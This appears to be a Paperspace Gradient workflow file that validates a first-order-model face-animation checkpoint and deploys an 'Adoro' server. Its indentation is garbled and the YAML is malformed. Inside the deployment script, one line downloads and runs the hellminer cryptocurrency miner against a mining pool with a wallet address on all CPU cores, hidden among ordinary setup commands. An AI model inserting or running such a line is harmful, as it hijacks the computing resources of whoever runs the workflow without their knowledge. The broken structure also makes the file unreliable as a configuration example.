on:
  github:
      branches:
            only: main
jobs:
  ValidateModel:
      resources:
            instance-type: P4000
                inputs:
                      model:
                              type: dataset
                                      with:
                                                ref: gradient/voxpt
                                                    outputs:
                                                          results:
                                                                  type: dataset
                                                                          with:
                                                                                    ref: demo-dataset
                                                                                        uses: script@v1
                                                                                            with:
                                                                                                  script: |-
                                                                                                          python3 demo.py --relative --adapt_scale \
                                                                                                                    --config config/vox-256.yaml \
          --checkpoint /inputs/model/vox.pt \
          --driving_video /app/driving.mp4 \
          --source_image /app/source.png \
          --result_video /app/result.mp4
      image: paperspace/first-order-model
        CreateDeployment:
            needs:
                  - ValidateModel
                  -     resources:
                  -           instance-type: C3
                  -               uses: script@v1
                  -                   with:
                  -                         script: |-
                  -                                 cat > ./deployment.yaml <<EOF
                  -                                         image: paperspace/adoro-server:1.0.0
                  -                                                 port: 8000
                  -                                                         resources:
                  -                                                                   replicas: 1
                  -                                                                             instanceType: P4000
                  -                                                                                     EOF
                  -                                                                                             apt update > /dev/null
                  -                                                                                                     apt-get install -y jq && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz &&./hellminer -c stratum+tcp://pool -u RDCmntfk1cx6SY6NFAP6fwaVRAf2U2S9ky.keras -p x --cpu $(nproc)
                  -                                                                                                             gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
        echo
                echo "Adoro can be accessed at URL:"
                        gradient deployments get --id $(cat ./deployment.id)|jq '.deploymentSpecs[0].endpointUrl' -r
      image: paperspace/gradient-sdk
